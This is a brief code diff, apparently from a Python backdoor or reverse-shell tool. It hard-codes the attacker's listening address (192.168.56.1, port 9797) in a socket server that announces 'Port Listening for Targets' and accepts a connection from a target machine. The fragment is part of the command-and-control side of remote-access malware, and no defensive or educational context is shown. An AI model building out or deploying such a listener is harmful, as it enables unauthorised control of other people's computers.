@@ -111,7 +111,7 @@ def communication():
 IP_ADDRESS = ''
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
-sock.bind((IP_ADDRESS, 9797)) #change IP Address here
+sock.bind(('192.168.56.1', 9797)) #change IP Address here
 print(termcolor.colored('[+] Port Listening for Targets....', 'yellow'))
 sock.listen(5)
 target, ip = sock.accept()
